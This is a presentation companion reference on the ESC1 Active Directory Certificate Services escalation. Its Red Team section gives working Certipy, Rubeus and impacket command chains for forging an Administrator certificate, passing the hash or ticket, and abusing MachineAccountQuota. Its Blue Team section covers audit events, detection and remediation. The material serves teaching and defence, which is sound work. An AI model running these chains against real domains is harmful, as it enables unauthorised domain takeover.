# ESC1 — ADCS Privilege Escalation

Command reference to accompany the presentation slides.

## Table of Contents

- [Tools](#tools)
- [Red Team](#red-team)
  - [Discovery](#discovery)
  - [Get Target SID](#get-target-sid)
  - [Request Certificate](#request-certificate)
  - [Verify Certificate](#verify-certificate)
  - [Option A — Certipy Auth](#option-a--certipy-auth-noisier)
  - [Option B — Rubeus PTT](#option-b--rubeus-ptt-preferred)
  - [Domain Computers-Only Templates](#domain-computers-only-templates)
- [Blue Team](#blue-team)
  - [Proactive Template Monitoring](#proactive-template-monitoring)
  - [Enable Audit Logging](#enable-audit-logging)
  - [Relevant Events](#relevant-events)
  - [Detection Notes](#detection-notes)
  - [Detection Coverage](#detection-coverage)
  - [Remediation](#remediation)
- [References](#references)

---

## Tools

| Tool | Source |
|---|---|
| Certipy-ad | https://github.com/ly4k/Certipy |
| Certify | https://github.com/GhostPack/Certify |
| Rubeus | https://github.com/GhostPack/Rubeus |
| Impacket | https://github.com/fortra/impacket |

---

## Red Team

### Discovery

```bash
# Linux
certipy find -u <user>@<domain> -password <pass> -dc-ip <DC IP>

# Windows
.\Certify.exe find /vulnerable
```

### Get Target SID

```powershell
# Windows (PowerShell)
([System.DirectoryServices.DirectorySearcher]"(&(objectClass=user)(cn=Administrator))").FindOne() `
  | % { $sid = New-Object System.Security.Principal.SecurityIdentifier($_.Properties.objectsid[0],0); $sid.Value }
```

### Request Certificate

```bash
certipy req \
  -u <user>@<domain> -password <pass> \
  -target <CA FQDN> \
  -ca <CA name> \
  -template "<template name>" \
  -upn <target>@<domain> \
  -sid <target SID>
```

### Verify Certificate

```bash
openssl pkcs12 -in administrator.pfx -clcerts -nokeys | openssl x509 -noout -text
# Confirm: Subject = requesting user, SAN = target account
```

### Option A — Certipy Auth (noisier)

```bash
# Retrieve NT hash
certipy auth -pfx administrator.pfx -dc-ip <DC IP>

# Pass-the-hash
smbclient.py -hashes ":<NT hash>" Administrator@<DC FQDN>   # low noise
wmiexec.py   -hashes ":<NT hash>" Administrator@<DC FQDN>   # noisy
psexec.py    -hashes ":<NT hash>" Administrator@<DC FQDN>   # noisy
```

### Option B — Rubeus PTT (preferred)

```powershell
# 1. Request TGT
.\Rubeus.exe asktgt /user:Administrator /certificate:.\administrator.pfx `
  /domain:<domain> /dc:<DC FQDN> /opsec /enctype:aes256 /nowrap

# 2. Open clean session
runas /netonly /user:<DOMAIN>\Administrator cmd.exe   # any password

# 3. Inject TGT (in new terminal)
.\Rubeus.exe ptt /ticket:<Base64 TGT>

# 4. Verify
klist

# 5. Access resources
dir \\<DC FQDN>\c$
```

### Domain Computers-Only Templates

```bash
# Check MachineAccountQuota (default: 10)
ldapsearch -x -H ldap://<DC IP> -D "<user>@<domain>" -w <pass> \
  -b "DC=<domain>,DC=<tld>" "(objectClass=domain)" ms-DS-MachineAccountQuota

# Add a computer account, then re-run certipy req with computer credentials
addcomputer.py <domain>/<user>:<pass>
```

---

## Blue Team

### Proactive Template Monitoring

```powershell
# Certify-wrapper.ps1
$log = "C:\Logs\Certify-$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').txt"
& "C:\Tools\Certify.exe" find /vulnerable /enabled /quiet 2>&1 | Out-File $log -Encoding utf8
```

```cmd
# Scheduled task — weekly, Sunday 03:00
schtasks /Create /TN "Certify Weekly Enum" ^
  /TR "powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Scripts\Certify-wrapper.ps1" ^
  /SC WEEKLY /D SUN /ST 03:00 /F
```

```bash
# Linux / jump host
certipy find -u <svc>@<domain> -password <pass> -dc-ip <DC IP> -vulnerable
```

### Enable Audit Logging

Run on the CA server:

```cmd
auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable
```

GPO path: `Computer Configuration → Policies → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Audit Policies → Object Access → Audit Certification Services`

### Relevant Events

| Event | Source | Description |
|---|---|---|
| 4886 | CA Security log | Certificate request received |
| 4887 | CA Security log | Certificate issued |
| 4768 | DC Security log | TGT requested — check `Pre-Authentication Type` (15/16 = PKINIT) |
| 4769 | DC Security log | Service ticket requested — check `Ticket Options` for U2U bit |
| 4624 | DC Security log | Logon — check `Authentication Package` (NTLM vs Kerberos) |

### Detection Notes

**4886/4887** — most valuable early-stage signal. SAN principal higher-privileged than the requester = suspicious. Ensure CA server Security logs are forwarded to your SIEM — often missed in default log forwarding configs.

**4768** — `Pre-Authentication Type` 15 or 16 = certificate-based auth. Anomalous for standard user accounts. Filter machine accounts (`%$`) and known smart card / WHfB users.

**4769** — U2U bit (bit 28, `ENC-TKT-IN-SKEY`) set in `Ticket Options` = `certipy auth`. Correlate with a preceding 4768 PKINIT from the same account to reduce false positives. Rubeus PTT does **not** set this bit.

**4624** — `certipy auth` + impacket produces NTLM. Rubeus PTT produces Kerberos. NTLM logon from a privileged account is anomalous in most environments.

### Detection Coverage

| Event | Certipy Auth | Rubeus PTT |
|---|---|---|
| 4886/4887 cert request | ✅ | ✅ |
| 4768 PKINIT | ✅ | ✅ |
| 4769 U2U | ✅ | ❌ |
| 4624 NTLM | ✅ | ❌ |
| 4624 Kerberos | ❌ | ✅ |

### Remediation

```powershell
# Set MachineAccountQuota to 0
Set-ADObject -Identity (Get-ADDomain).DistinguishedName `
  -Replace @{"ms-DS-MachineAccountQuota" = 0}
```

- Restrict template enrollment to a specific service account — remove `Authenticated Users` / `Domain Computers`
- If enrollment can't be restricted: enable **Manager Approval** on the template (Issuance Requirements tab)

---

## References

- https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates
- https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf
- https://attack.mitre.org/techniques/T1649/
- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768
- https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769
